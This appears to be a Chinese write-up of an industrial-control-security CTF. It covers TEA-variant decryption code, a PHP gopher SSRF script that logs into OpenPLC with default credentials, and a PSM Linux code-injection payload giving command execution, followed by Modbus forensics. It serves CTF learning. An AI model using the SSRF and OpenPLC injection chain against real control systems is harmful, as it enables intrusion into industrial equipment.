---
title: 2021 年工业信息安全技能大赛 - 线上第二场 WriteUp
contest: 2021 工业信息安全技能大赛
year: 2021
difficulty: hard
vuln_type: [reverse, ssrf, rce, block_cipher, web_unknown, forensic_disk]
tags: [TEA, XTEA, XXTEA, rand-srand-seed, OpenPLC, RCE, gopher, PSM-Linux, 工控, ICS, PLC, SCADA, WinCC, 7z]
attack_chain: ["reverse: 变种 TEA 解密，sum=0xC6EF3720 delta=0x9e3779b9 32 轮", "reverse: 改进 TEA sum=0x62F35080 delta=0x458BCD42 64 轮 + XOR 0x10/0x20", "解密 flag.png.enc: srand(1626940252) 生成 XOR key + TEA 解 16 字节一块", "SSRF: 扫端口发现 172.16.238.99:8080 是 OpenPLC", "gopher 打 OpenPLC: openplc:openplc 默认账号登录", "POST /hardware 上传 PSM Linux custom_layer_code 注入 Python 命令", "GET /compile-program?file=blank_program.st 编译 → /start_plc 启动 → /runtime_logs 看输出", "mod traffic: 流量分析 modbus 找备份文件", "7z 头修复（缺 37 7A 头）解压得 WinCC 项目", "flag 藏在组态文件尾部: flag{SPwAvMx0z5jtP5gT}"]
key_payload: "srand(1626940252) + tea_key={0x0D,0x0E,0x0A,0x0D,...0xEF}  → flag.png"
one_liner: 工控 CTF 经典：变种 TEA + SSRF→OpenPLC RCE + Modbus 流量 + 7z 修复 + WinCC
lesson: 工控/ICS 安全赛要熟悉 OpenPLC、WinCC、Modbus；TEA 系列密码 + srand 爆破是 reverse 入门
quality: high
---

# 2021 工业信息安全技能大赛 - 线上第二场

原文 https://www.ctfiot.com/1512.html （ChaMd5 Venom 招新帖）

## 题目分类

### 1) Reverse: 变种 TEA
**经典 TEA:**
```c
void decrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720;
    uint32_t delta=0x9e3779b9;
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];
    for (int i=0; i<32; i++) {
        v1 -= ((v0<<4)+k2) ^ (v0+sum) ^ ((v0>>5)+k3);
        v0 -= ((v1<<4)+k0) ^ (v1+sum) ^ ((v1>>5)+k1);
        sum -= delta;
    }
}
```

**改进 TEA:**
```c
void decrypt(unsigned int* v, unsigned int* k) {
    unsigned int v0=v[0], v1=v[1], sum=0x62F35080;
    unsigned int delta=0x458BCD42;
    for (int i=0; i<64; i++) {
        v1 -= ((((v0<<6)+k2) ^ (v0+sum+20) ^ ((v0>>9)+k3)) ^ 0x10);
        v0 -= ((((v1<<6)+k0) ^ (v1+sum+11) ^ ((v1>>9)+k1)) ^ 0x20);
        sum -= delta;
    }
}
```

### 2) Crypto: flag.png.enc 解密
```c
unsigned char tea_key[16] = {0x0D,0x0E,0x0A,0x0D,0x0B,0x0E,0x0E,0x0F,
                              0x12,0x34,0x56,0x78,0x90,0xAB,0xCD,0xEF};
unsigned char png[4] = {0x89,0x50,0x4E,0x47};
int seed = 1626940252;
srand(seed);
for (int i=0; i<0x32d5; i++) {
    key = (unsigned char)rand();
    magic[i] ^= key;
}
for (int k=0; k<0x32d5; k+=16) {
    decrypt((unsigned int*)(magic+k), (unsigned int*)tea_key);
}
```

### 3) SSRF → OpenPLC RCE
```php
<?php
$u = 'http://192.168.87.114/?url=';
$addr = "172.16.238.99:8080";
$headers[] = "POST /login HTTP/1.1";
$headers[] = "Host: $addr";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
$data = "username=openplc&password=openplc";
$ssrf = "gopher://$addr/_" . urlencode(implode("\r\n",$headers)."\r\n\r\n") . urlencode($data);
$r = file_get_contents($u . urlencode($ssrf));
preg_match_all("/Set-Cookie: session=(.+?); Expire/", $r, $m);
$cookie = "session=".$m[1][0];
?>
```

**Step 2: 注入 PSM Linux custom_layer_code**
```
hardware_layer=psm_linux&custom_layer_code=__import__(os).system('ls+-alh+/')
```

**Step 3: 编译 + 启动 + 看日志**
```
GET /compile-program?file=blank_program.st
GET /start_plc
GET /runtime_logs
```

### 4) Modbus 流量分析
- 找 beifen 备份文件
- 7z 头缺 `37 7A` → 补齐
- 解压得 WinCC 组态项目

### 5) 隐藏 flag
- 在 WinCC 组态文件尾部
- `flag{SPwAvMx0z5jtP5gT}`

## 教学价值
- **工控/ICS 安全** 是新兴方向
- **TEA 变种** 经常出现在 reverse 入门：
  - 经典 TEA: 32 轮、sum=0xC6EF3720
  - XTEA: delta=0x9E3779B9
  - XXTEA: 块加密
  - 改进: 改 sum/delta/移位/XOR 常数
- **OpenPLC** 是开源 PLC runtime，常被用于工控 CTF
- **gopher 打 RCE** 是 SSRF → 内部协议利用的经典
- **Modbus TCP** 端口 502 流量分析
- **7z 文件头** `37 7A BC AF 27 1C` 头 6 字节 magic

## 工控 CTF 工具链
- Wireshark + modbus 解析
- OpenPLC Runtime（docker 部署）
- WinCC 7.x / TIA Portal
- python snap7
- gopher 协议构造工具
